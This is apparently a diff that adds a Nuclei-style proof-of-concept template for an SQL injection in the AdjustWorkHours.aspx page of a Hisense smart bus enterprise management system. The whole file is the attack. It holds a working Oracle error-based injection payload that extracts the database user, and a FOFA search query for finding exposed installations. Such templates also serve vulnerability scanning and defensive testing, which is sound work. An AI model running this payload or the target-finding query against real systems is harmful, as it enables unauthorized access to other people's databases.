@@ -1,0 +1,23 @@
+id: poc-yfnit87bqxrqqt6a
+info:
+  name: Hisense-海信公交智能公交企业管理系统AdjustWorkHours存在Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yfnit87bqxrqqt6a'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yfnit87bqxrqqt6a
+    fofa: '"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"||body="var _FactoryData"'
+http:
+- raw:
+  - 'GET /YZSoft/Forms/XForm/BM/MaintainComManagement/AdjustWorkHours.aspx?key=-1%27%20and%20(select%20dbms_xdb_version.checkin((select%20user%20from%20dual))%20from%20dual)is%20not%20null-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
